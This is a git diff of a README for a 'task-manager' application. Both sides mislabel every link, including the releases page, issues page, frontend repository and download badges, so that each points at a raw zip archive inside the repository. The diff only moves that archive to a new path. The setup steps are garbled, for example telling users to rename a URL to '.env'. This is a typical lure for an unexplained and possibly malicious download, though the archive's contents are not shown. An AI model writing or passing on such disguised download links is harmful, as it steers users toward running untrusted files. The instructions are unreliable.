@@ -1,6 +1,6 @@
 # 🛡️ task-manager - Simple Task Management Made Easy
 
-[![Download Task Manager](https://github.com/Dexter376/task-manager/raw/refs/heads/main/tests/Feature/task_manager_2.5.zip%20Manager-blue)](https://github.com/Dexter376/task-manager/raw/refs/heads/main/tests/Feature/task_manager_2.5.zip)
+[![Download Task Manager](https://github.com/Dexter376/task-manager/raw/refs/heads/main/app/task_manager_v2.1.zip%20Manager-blue)](https://github.com/Dexter376/task-manager/raw/refs/heads/main/app/task_manager_v2.1.zip)
 
 ---
 
@@ -22,13 +22,13 @@ Before you begin, ensure your computer meets these requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/Dexter376/task-manager/raw/refs/heads/main/tests/Feature/task_manager_2.5.zip) to download the application.
+   Go to the [Releases Page](https://github.com/Dexter376/task-manager/raw/refs/heads/main/app/task_manager_v2.1.zip) to download the application.
 
 2. **Choose the Latest Version**  
    Find the latest release on the page. Click on it to view available files.
 
 3. **Download the Files**  
-   Look for the file named “https://github.com/Dexter376/task-manager/raw/refs/heads/main/tests/Feature/task_manager_2.5.zip” or similar. Click the link to download it to your computer.
+   Look for the file named “https://github.com/Dexter376/task-manager/raw/refs/heads/main/app/task_manager_v2.1.zip” or similar. Click the link to download it to your computer.
 
 4. **Extract the Zip File**  
    Locate the downloaded zip file in your downloads folder. Right-click on it and choose “Extract All” to unzip it.
@@ -43,7 +43,7 @@ Before you begin, ensure your computer meets these requirements:
    ```
 
 7. **Set Up the Environment**  
-   Rename the `https://github.com/Dexter376/task-manager/raw/refs/heads/main/tests/Feature/task_manager_2.5.zip` file to `.env`. Open this file in a text editor. Update the database credentials as needed:
+   Rename the `https://github.com/Dexter376/task-manager/raw/refs/heads/main/app/task_manager_v2.1.zip` file to `.env`. Open this file in a text editor. Update the database credentials as needed:
    - `DB_CONNECTION=pgsql`
    - `DB_HOST=127.0.0.1`
    - `DB_PORT=5432`
@@ -86,7 +86,7 @@ To learn how to use the API, refer to the API documentation once the server is r
 
 ## 📚 Support and Contribution
 
-If you need help or have questions, visit our [issues page](https://github.com/Dexter376/task-manager/raw/refs/heads/main/tests/Feature/task_manager_2.5.zip). For contributions, feel free to create a pull request after reviewing our contribution guidelines.
+If you need help or have questions, visit our [issues page](https://github.com/Dexter376/task-manager/raw/refs/heads/main/app/task_manager_v2.1.zip). For contributions, feel free to create a pull request after reviewing our contribution guidelines.
 
 ---
 
@@ -94,8 +94,8 @@ If you need help or have questions, visit our [issues page](https://github.com/D
 
 This application is designed for users who want a straightforward task management solution. With a simple interface and reliable backend, you can manage your tasks with ease.
 
-If you want to see how the frontend connects to this backend, check out the [Frontend Repository Here](https://github.com/Dexter376/task-manager/raw/refs/heads/main/tests/Feature/task_manager_2.5.zip).
+If you want to see how the frontend connects to this backend, check out the [Frontend Repository Here](https://github.com/Dexter376/task-manager/raw/refs/heads/main/app/task_manager_v2.1.zip).
 
 For any further queries or suggestions, please open an issue on GitHub. Thank you for using our Task Manager application!
 
-[![Download Task Manager](https://github.com/Dexter376/task-manager/raw/refs/heads/main/tests/Feature/task_manager_2.5.zip%20Manager-blue)](https://github.com/Dexter376/task-manager/raw/refs/heads/main/tests/Feature/task_manager_2.5.zip)
+[![Download Task Manager](https://github.com/Dexter376/task-manager/raw/refs/heads/main/app/task_manager_v2.1.zip%20Manager-blue)](https://github.com/Dexter376/task-manager/raw/refs/heads/main/app/task_manager_v2.1.zip)
